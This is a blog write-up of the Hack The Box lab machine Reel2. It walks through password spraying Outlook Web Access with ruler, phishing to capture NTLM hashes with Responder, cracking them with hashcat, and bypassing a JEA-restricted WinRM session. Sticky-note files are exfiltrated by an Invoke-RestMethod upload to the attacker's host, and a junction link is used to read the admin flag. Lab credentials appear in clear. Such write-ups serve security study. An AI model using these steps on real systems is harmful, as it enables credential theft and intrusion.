<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(HTB) - Reel2" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introducted to JEA security concept by Microsoft" /><meta property="og:description" content="Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introducted to JEA security concept by Microsoft" /><link rel="canonical" href="https://an9k0r.github.io/posts/Reel2/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Reel2/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-22T11:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(HTB) - Reel2" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introducted to JEA security concept by Microsoft","headline":"(HTB) - Reel2","dateModified":"2022-10-03T05:54:52+02:00","url":"https://an9k0r.github.io/posts/Reel2/","datePublished":"2022-09-22T11:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Reel2/"},"@context":"https://schema.org"}</script><title>(HTB) - Reel2 | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(HTB) - Reel2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/4a58107e5c26c8a34a07b1bd3f029434c474db6089714e95ded821425c7d74a1.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(HTB) - Reel2</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-22 11:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 22, 2022, 11:33 AM +0200" >Sep 22, 2022</em> </span> <span> Updated <em class="timeago" date="2022-10-03 05:54:52 +0200 " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 3, 2022, 5:54 AM +0200" >Oct 3, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="954 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p><strong>Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introducted to JEA security concept by Microsoft</strong></p><h1 id="enumeration">ENUMERATION</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.10.210
Host is up (0.044s latency).
Not shown: 991 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: 403 - Forbidden: Access is denied.
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=Reel2
| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local
| Issuer: commonName=Reel2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-07-30T10:12:46
| Not valid after:  2025-07-30T10:12:46
| MD5:   aa49 5cac 7115 c7fe 0628 2a6b 0124 37c4
|_SHA-1: d7ea 2696 a56f 09cb 24ce 557f 830e 86ec 5f63 0f2d
|_ssl-date: 2021-01-28T06:31:11+00:00; 0s from scanner time.
6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6005/tcp open  msrpc      Microsoft Windows RPC
6006/tcp open  msrpc      Microsoft Windows RPC
6007/tcp open  msrpc      Microsoft Windows RPC
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
|_http-title: Welcome | Wallstant
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><h2 id="gobuster">GOBUSTER<a href="#gobuster" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>luka@kali:~$ gobuster dir -u https://reel2.htb.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://reel2.htb.local
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/28 08:29:32 Starting gobuster
===============================================================
/public (Status: 302)
/exchange (Status: 302)
/Public (Status: 302)
/rpc (Status: 401)
/owa (Status: 301)
</pre></table></code></div></div><h1 id="exploitation">EXPLOITATION</h1><h2 id="owa">OWA<a href="#owa" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’S focus on OWA. <img data-src="/assets/images/5949aad5c31309258406c4487f88d0f3f9437cb205fac1dd0b502469817b4f17.png" alt="picture 12" data-proofer-ignore></p><h2 id="webserver">WEBSERVER<a href="#webserver" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/1f8d57fe1882199b996e70eca6b5dfdecf5b8db0afeefdc5c118bc31e9e57e8e.png" alt="picture 13" data-proofer-ignore></p><p>Logged in and started gobuster with cookie</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://reel2.htb.local:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,bak,txt -c "PHPSESSID=np9phr5h2gjnjrvg9jroca76la"
</pre></table></code></div></div><p>Nothing found so far</p><p>This part was hard!!</p><p>So there we have a few user which could be used for bruteforce attack against OWA and web application. User sven (svensson nickname or lastname) has a post and summer and hot may be actually hints (it is a CTF right). There is also Lars Larsson but without any posts and 2 other users.</p><p><img data-src="/assets/images/7c2e2d55445027a769e1538409c8413f44d1021e1eed94318386838ad6f609b7.png" alt="picture 14" data-proofer-ignore></p><p>Used following <a href="https://github.com/sukantsharma/username-generator/blob/master/username.py">script</a>, but deleted following lines:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>while num == '':
	num = raw_input("Enter Birth Year: ")
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat generate-username.py | grep -v "num" &gt; generate-username-no_birth_year.py
</pre></table></code></div></div><p>And ran it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>luka@kali:~/htb/reel2$ python generate-username-no-birthday.py 
_____________________________________________________________

username by Sukant | sukant929@protonmail.com
Generate username using First Name, Last Name &amp; Birth Year... 
***** All fields are mandatory *****
_____________________________________________________________

Enter First Name: sven
Enter Last Name: svensson

---------------------------------------

sven
svensson
svensvensson
svenssonsven
sven.svensson
svensson.sven
sven_svensson
svensson_sven
svens
svenssons
ssvensson
ssven
s.svensson
s.sven
s_svensson
s_sven
sven.s
svensson_s

---------------------------------------
</pre></table></code></div></div><p>Tests with summer2020, Summer2020 (used already in simmilar CTFs) coincedently when i was searching for password spraying tools for owa, i’ve found the password on hacktricks :)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose

luka@kali:~/htb/reel2$ /home/luka/tools/ruler/ruler --domain reel2.htb -k brute --users usernames --passwords passes.txt --delay 0 --verbose                                          
[+] Starting bruteforce
[+] Trying to Autodiscover domain
[+] 0 of 3 passwords checked
[x] Failed: sven:summer2020
...SNIP...
[x] Failed: svenssons:Summer2020
[x] Failed: ssvensson:Summer2020
[x] Failed: ssven:Summer2020
[+] Success: s.svensson:Summer2020
[x] Failed: s.sven:Summer2020
[x] Failed: s_sven:Summer2020
...SNIP...
</pre></table></code></div></div><p>Login works:</p><p><img data-src="/assets/images/9b2f279087c54851bc1cad8329e9107927a3bc6357d69f3fa26cece8f7ef9bbf.png" alt="picture 15" data-proofer-ignore></p><p>Clicking on “Om” shows more details</p><p><img data-src="/assets/images/90530405142bf0630fbecd51d5eec05db8321f330cebd0cccd724383d91c5964.png" alt="picture 16" data-proofer-ignore></p><p><img data-src="/assets/images/6503263df937fd7fab659a635cbfebfef824351727b59a58d2a6f4214c776fd9.png" alt="picture 17" data-proofer-ignore></p><h2 id="phishing">Phishing<a href="#phishing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ve used light version because normal one did’t open address book.</p><p><img data-src="/assets/images/6fe333956a9bb075955ab8c6f49f9ee4a83f0fd6a18fb2311c0b1d4184977240.png" alt="picture 18" data-proofer-ignore></p><p>Sending a message and start responder beforehand!! (<code class="language-plaintext highlighter-rouge">sudo responder -I tun0</code>)</p><p><img data-src="/assets/images/37cff9af72034661cc4922dd47bc667dcdae05b6b74955c7992c3511dccdfff5.png" alt="picture 20" data-proofer-ignore></p><p>Getting the hash back in Responder!</p><p><img data-src="/assets/images/2f1b099440af4f4228bc01e2378de79165209f419c3a497c297834c15e5a39a9.png" alt="picture 21" data-proofer-ignore></p><p>Hashcat was successful at cracking the hash using the mod 5600</p><p><img data-src="/assets/images/8290accd9e3918b560f51e1451ef3be16ec9a3aa2ad9670d1ab7bb0f707ae4a5.png" alt="picture 22" data-proofer-ignore></p><p>Winrm works but gives an error</p><p><img data-src="/assets/images/1aa21a1c975c7aab236c580d389acd5ca52394317f4a2df4ad75a6c362f16c04.png" alt="picture 23" data-proofer-ignore></p><p>I’VE USED WINDOWS from HERE!!</p><h2 id="winrm-as-ksvensson">WinRM as k.svensson<a href="#winrm-as-ksvensson" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’VE USED WINDOWS from HERE!!</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">Enable-PSRemoting</span><span class="w"> </span><span class="nt">-SkipNetworkProfileCheck</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-Item</span><span class="w"> </span><span class="nx">WSMan:\localhost\Client\TrustedHosts</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s2">"10.10.10.210"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">

</span><span class="c"># Connect (password kittycat1)</span><span class="w">

</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="nx">10.10.10.210</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nx">HTB\k.svensson</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">Negotiate</span><span class="w">
</span></pre></table></code></div></div><p>Connection was succesful commands aren’t working:</p><p><img data-src="/assets/images/adeaed890c3add6be656525dbbc8e48637d650f0a3812df788d70585bdd5f0f2.png" alt="picture 24" data-proofer-ignore></p><p>In Linux this happens if commands are not in PATH…</p><p>This however does not seem to be the case here</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;$env:Path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\Microsoft\Exchange Server\V14\bin
</pre></table></code></div></div><p>Solution was to run the commands in &amp; (to launch command in script block {} =&gt; e.g. &amp;{ls}</p><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="finding-sticky-notes">Finding Sticky Notes<a href="#finding-sticky-notes" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Since there was a shortcut left for sticky notes and it seems that privesc has something to do with it, i copied the contents to view them on my machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>C:\Users\k.svensson\AppData\Roaming&gt;xcopy stickynotes\* C:\Users\k.svensson\Links\stickynotes /E /H

C:\Users\k.svensson\Links&gt;powershell -c "Compress-Archive -Path .\stickynotes -DestinationPath .\stickynotes.zip"
</pre></table></code></div></div><p>SERVER on Windows: <code class="language-plaintext highlighter-rouge">python3.9.exe .\server.py --bind 0.0.0.0</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell -c "Invoke-RestMethod -Uri http://10.10.14.22:8000/stickynotes.zip -infile .\stickynotes.zip -method put"
</pre></table></code></div></div><p><img data-src="/assets/images/4fe688e35ed6316f375c0702bd08e39e6f2d08daa40fa4dc979a67d472e0ec9b.png" alt="picture 25" data-proofer-ignore></p><p>Credentials found were: <code class="language-plaintext highlighter-rouge">jea_test_account:Ab!Q@vcg^%@#1</code>.</p><p>Short article to <a href="https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.2">JEA</a> (Just Enough Administraton).</p><p>searching for jea_test_account yields few results</p><p><img data-src="/assets/images/16c6a925c76b88bd3f0cf97d48c5476d24b4c26c391ff93c005fe480af46c06a.png" alt="picture 26" data-proofer-ignore></p><p>Both <code class="language-plaintext highlighter-rouge">jea_test_account</code> files are writable but they dont execute.</p><p>Creating symlink in order to exploit Check-Name in jea_test_account profile solves that issue:</p><p><img data-src="/assets/images/e5263b3f089df3bca78bcae1c0a38eab091370da46d895319a7c6800fda235a0.png" alt="picture 27" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;&amp;{cmd /c mklink /J adm c:\Users\Administrator\Desktop}
Junction created for adm &lt;&lt;===&gt;&gt; c:\Users\Administrator\Desktop
</pre></table></code></div></div><h2 id="reading-the-roottxt">Reading the root.txt<a href="#reading-the-roottxt" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS C:\Users\hosoj&gt; Enter-PSSession -Computer 10.10.10.210 -credential HTB\k.svensson -ConfigurationName jea_test_account -Authentication Negotiate

[10.10.10.210]: PS&gt;Check-File C:\ProgramData\adm\root.txt
349ece0aac********0dd0f2a4115
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >Powershell</a> <a href="/tags/owa/" class="post-tag no-text-decoration" >OWA</a> <a href="/tags/password-spraying/" class="post-tag no-text-decoration" >Password Spraying</a> <a href="/tags/iis/" class="post-tag no-text-decoration" >IIS</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >Phishing</a> <a href="/tags/user-enumeration/" class="post-tag no-text-decoration" >User Enumeration</a> <a href="/tags/jea-bypass/" class="post-tag no-text-decoration" >JEA Bypass</a> <a href="/tags/social-engineering/" class="post-tag no-text-decoration" >Social Engineering</a> <a href="/tags/clear-text-credentials/" class="post-tag no-text-decoration" >Clear Text Credentials</a> <a href="/tags/defense-mechanisms/" class="post-tag no-text-decoration" >Defense Mechanisms</a> <a href="/tags/hash-capture/" class="post-tag no-text-decoration" >Hash Capture</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >Password Cracking</a> <a href="/tags/packet-capture-analysis/" class="post-tag no-text-decoration" >Packet Capture Analysis</a> <a href="/tags/weak-credentials/" class="post-tag no-text-decoration" >Weak Credentials</a> <a href="/tags/memory-dump/" class="post-tag no-text-decoration" >Memory Dump</a> <a href="/tags/account-misconfiguration/" class="post-tag no-text-decoration" >Account Misconfiguration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(HTB) - Reel2 - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Reel2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(HTB) - Reel2 - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Reel2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(HTB) - Reel2 - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Reel2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap 